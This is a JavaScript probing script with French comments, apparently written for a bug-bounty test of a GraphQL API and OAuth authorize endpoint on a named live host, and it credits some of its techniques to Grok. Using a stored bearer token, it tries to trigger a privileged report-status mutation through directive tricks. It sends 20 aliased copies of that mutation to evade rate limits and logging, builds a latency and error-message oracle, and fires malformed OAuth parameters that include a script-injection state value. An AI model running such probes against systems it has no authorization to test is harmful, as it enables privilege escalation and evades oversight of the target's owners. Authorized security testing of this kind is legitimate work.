// Techniques "inventives" de Grok, testables sans privilege supplementaire :
//  A) @include / @skip sur une mutation privilegee
//  B) @defer / @stream (decouverte de capacites)
//  C) alias x20 sur une mutation privilegee (contournement de rate-limit / logging)
//  D) oracle doux : comparer message ET latence entre (scope manquant) / (objet absent) / (acces)
//  E) confusion de binding : code_challenge / state / redirect_uri dans des formes tordues
import fs from "fs";
import { ensureToken } from "/tmp/opencode/token-store.mjs";
const API = "https://bugsecure-api.senintel.sn";
const EP = API + "/graphql";
const AS = "https://bugsecure-api.senintel.sn";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const form = (o) => Object.entries(o).map(([k, v]) => encodeURIComponent(k) + "=" + encodeURIComponent(v)).join("&");
const { token } = await ensureToken(AS);
const H = { "Content-Type": "application/json", Authorization: "Bearer " + token };

async function gql(query, variables) {
  const t0 = Date.now();
  const r = await fetch(EP, { method: "POST", headers: H, body: JSON.stringify({ query, variables }) });
  const txt = await r.text();
  let j = null; try { j = JSON.parse(txt); } catch {}
  return { ms: Date.now() - t0, s: r.status, j, txt };
}
const brief = (r) => (r.j?.errors ? "ERR: " + r.j.errors.map((e) => e.message).join(" | ") : JSON.stringify(r.j?.data)).replace(/\s+/g, " ").slice(0, 150);
const show = (l, r) => console.log("  " + l.padEnd(46) + String(r.ms).padStart(5) + "ms  " + brief(r));

console.log("=== A) @include / @skip sur une mutation privilegee ===");
const priv = `mutation { updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) { id } }`;
show("mutation directe (sans directive)", await gql(priv, {}));
show("@include(if:true) sur la mutation", await gql(`mutation { u: updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) @include(if: true) { id } }`, {}));
show("@include(if:false) sur la mutation", await gql(`mutation { u: updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) @include(if: false) { id } }`, {}));
show("@skip(if:false) sur la mutation", await gql(`mutation { u: updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) @skip(if: false) { id } }`, {}));
show("@skip(if:true) sur la mutation", await gql(`mutation { u: updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) @skip(if: true) { id } }`, {}));
show("@include(if:$v) avec variable false", await gql(`mutation($v: Boolean!){ u: updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) @include(if: $v) { id } }`, { v: false }));
show("@include(if:$v) avec variable true", await gql(`mutation($v: Boolean!){ u: updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) @include(if: $v) { id } }`, { v: true }));
show("@include(if: \"true\") (type incorrect)", await gql(`mutation { u: updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) @include(if: "true") { id } }`, {}));

console.log("\n=== B) @defer / @stream ===");
show("@defer sur une query", await gql(`query { me { id } ... @defer { reportCount } }`, {}));
show("@defer (inline) sur une query", await gql(`query { me { id } ... @defer(label: "x") { reportCount } }`, {}));
show("@stream sur une liste", await gql(`query { reports @stream(initialCount: 1) { id } }`, {}));
show("@defer + directive sur mutation", await gql(`mutation { u: updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) @defer { id } }`, {}));

console.log("\n=== C) alias multiples sur une mutation privilegee (rate-limit ? logging ?) ===");
const many = Array.from({ length: 20 }, (_, i) => `a${i}: updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) { id }`).join(" ");
show("20 alias de la meme mutation", await gql(`mutation { ${many} }`, {}));
const mixed = `a: me { id } b: getPrograms { id } c: updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) { id } d: getReports { id }`;
show("mixte public + privilege", await gql(`query { ${mixed} }`, {}));
show("mutation + query melangees", await gql(`mutation { a: updateResearcherProfile(input:{bio:"bb-mix"}) { id } } query { b: me { id } }`, {}));

console.log("\n=== D) oracle doux : scope manquant vs objet absent vs acces ===");
const N = 12;
const samples = { "scope manquant (getProgramStats)": [], "objet absent (getReport)": [], "acces reel (me)": [], "scope manquant (updateReportStatus)": [] };
const q1 = `query { getProgramStats(programId:"7cf52a09-38ca-48ec-a9a5-44c5d517718a") { total } }`;
const q2 = `query { getReport(reportId:"dca04201-559b-4088-bdc3-e1666ea42461") { id } }`;
const q3 = `query { me { id } }`;
const q4 = `mutation { updateReportStatus(input:{reportId:"dca04201-559b-4088-bdc3-e1666ea42461",status:"TRIAGED"}) { id } }`;
for (const [k, q] of [["scope manquant (getProgramStats)", q1], ["objet absent (getReport)", q2], ["acces reel (me)", q3], ["scope manquant (updateReportStatus)", q4]]) {
  for (let i = 0; i < N; i++) { const r = await gql(q, {}); samples[k].push(r.ms); await sleep(250); }
}
for (const [k, v] of Object.entries(samples)) {
  const s = [...v].sort((a, b) => a - b);
  const med = s[Math.floor(s.length / 2)];
  console.log("  " + k.padEnd(46) + "min=" + s[0] + "ms median=" + med + "ms max=" + s[s.length - 1] + "ms");
}

console.log("\n=== E) confusion de binding au /oauth/authorize ===");
const cases = [
  ["state tres long (2000 car.)", { state: "A".repeat(2000) }],
  ["state avec caracteres speciaux", { state: "<script>alert(1)</script>&x=1" }],
  ["code_challenge different de celui du token (S256 attendu)", { code_challenge: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM" }],
  ["code_challenge_method=plain", { code_challenge_method: "plain" }],
  ["code_challenge_method absent", { code_challenge_method: undefined }],
  ["redirect_uri avec fragment", { redirect_uri: "http://127.0.0.1:53682/cb#frag" }],
  ["redirect_uri avec slash final", { redirect_uri: "http://127.0.0.1:53682/cb/" }],
  ["scope duplique (2x programs:read)", { scope: "programs:read programs:read" }],
  ["resource + resource duplique", { resource: AS + " " + AS }],
  ["client_id avec espace final", { client_id: "bugsecure-mcp-cli " }],
];
for (const [lbl, over] of cases) {
  const q = { response_type: "code", client_id: "bugsecure-mcp-cli", redirect_uri: "http://127.0.0.1:53682/cb", scope: "programs:read profile:read reports:read reports:write", state: "bb-" + Date.now(), code_challenge: "FCwpR1pJLeFhZQu7BkPOcqIZ8QXf5YyXgWFDn_N7Sw8", code_challenge_method: "S256", resource: AS, ...over };
  const p = Object.fromEntries(Object.entries(q).filter(([, v]) => v !== undefined));
  const r = await fetch(AS + "/oauth/authorize?" + form(p), { redirect: "manual" });
  const loc = r.headers.get("location") || "";
  console.log("  " + lbl.padEnd(46) + "HTTP " + r.status + " -> " + (loc ? loc.replace("https://bugsecure.senintel.sn", "").slice(0, 80) : (await r.text()).slice(0, 80)));
  await sleep(500);
}
